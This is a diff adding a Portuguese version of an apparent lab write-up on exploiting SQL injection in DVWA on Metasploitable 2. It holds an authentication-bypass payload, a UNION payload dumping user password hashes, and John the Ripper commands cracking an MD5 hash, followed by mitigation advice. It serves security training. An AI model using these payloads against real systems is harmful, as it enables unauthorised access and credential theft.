@@ -132,3 +132,140 @@ The password was successfully recovered.
 
 - OWASP SQL Injection
 - DVWA Documentation
+
+
+
+---
+
+## 🇧🇷 Versão em Português
+
+# 🔓 SQL Injection - DVWA (Metasploitable)
+
+## 🎯 Objetivo
+Explorar uma vulnerabilidade de SQL Injection no DVWA para extrair credenciais de usuários e obter acesso não autorizado.
+
+---
+
+## 🖥️ Informações do Alvo
+- Aplicação: DVWA (Damn Vulnerable Web Application)
+- Ambiente: Metasploitable 2
+- Porta: 80 (HTTP)
+- Vulnerabilidade: SQL Injection
+- Nível de Segurança: Low
+
+---
+
+## 🔍 Enumeração
+
+A aplicação foi acessada via navegador:
+
+```
+http://<IP_DO_ALVO>/dvwa
+```
+
+Ao inspecionar o código-fonte da página, foi encontrado um *hint*:
+
+```html
+<p>username is 'admin' with password 'password'</p>
+```
+
+Isso indica exposição de credenciais no código da aplicação.
+
+---
+
+## 🔎 Análise da Vulnerabilidade
+
+A aplicação não sanitiza corretamente a entrada do usuário antes de utilizá-la em consultas SQL.
+
+Exemplo de consulta vulnerável:
+
+```sql
+SELECT * FROM users WHERE id = '<input>';
+```
+
+Isso permite manipular a lógica da consulta.
+
+---
+
+## 💥 Exploração
+
+### 🔹 Bypass de Autenticação
+
+Payload utilizado:
+
+```sql
+1' OR '1'='1' -- 
+```
+
+Esse payload força a condição a ser sempre verdadeira, permitindo contornar a autenticação.
+
+---
+
+### 🔹 Extração de Dados (SQL Injection com UNION)
+
+Payload utilizado:
+
+```sql
+1' UNION SELECT user, password FROM users -- 
+```
+
+Isso permitiu extrair:
+- usuários
+- hashes de senha
+
+---
+
+## 🧪 Pós-exploração
+
+Um hash foi obtido:
+
+```
+5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+O hash foi salvo em um arquivo:
+
+```bash
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+```
+
+E quebrado utilizando o John the Ripper:
+
+```bash
+john --format=raw-md5 hash.txt
+john --show hash.txt
+```
+
+---
+
+## 🔐 Impacto
+
+- Bypass de autenticação
+- Exposição de dados sensíveis
+- Quebra de senha devido a hash fraco (MD5)
+- Acesso completo às contas
+
+---
+
+## 🛡️ Mitigação
+
+- Utilizar prepared statements
+- Validar e sanitizar entradas
+- Não expor informações sensíveis no HTML
+- Utilizar algoritmos de hash seguros (bcrypt)
+
+---
+
+## 🧠 Lições Aprendidas
+
+- SQL Injection pode ser explorado com payloads simples
+- UNION permite extração de dados do banco
+- MD5 é inseguro e facilmente quebrado
+- Importância da análise do código-fonte
+
+---
+
+## 📚 Referências
+
+- OWASP SQL Injection
+- Documentação do DVWA
